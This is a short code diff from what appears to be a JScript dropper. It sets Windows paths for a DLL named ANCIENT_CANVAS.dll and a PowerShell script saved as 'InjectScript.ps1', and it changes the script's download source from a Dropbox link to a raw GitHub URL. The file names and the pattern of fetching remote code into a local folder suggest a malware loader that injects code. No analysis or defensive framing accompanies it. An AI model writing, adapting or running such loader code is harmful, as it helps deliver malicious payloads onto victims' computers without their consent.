@@ -8,7 +8,7 @@ try {
     var targetDll = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\ANCIENT_CANVAS.dll");
 
     // Define URL and target file path for the PowerShell script
-    var psUrl = "https://www.dropbox.com/scl/fi/2g7hjkyjgi84tru0cpse6/psscript.ps1?rlkey=wqq7h5t8wqbohdfh5krezwcx5&st=tvayqmxc&dl=1"; // Replace with the actual URL
+    var psUrl = "https://raw.githubusercontent.com/Scriptjunkie1/zzzzz/main/psscript.ps1"; // Replace with the actual URL
     var targetPs = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\InjectScript.ps1");
 
     // Ensure the target directory exists
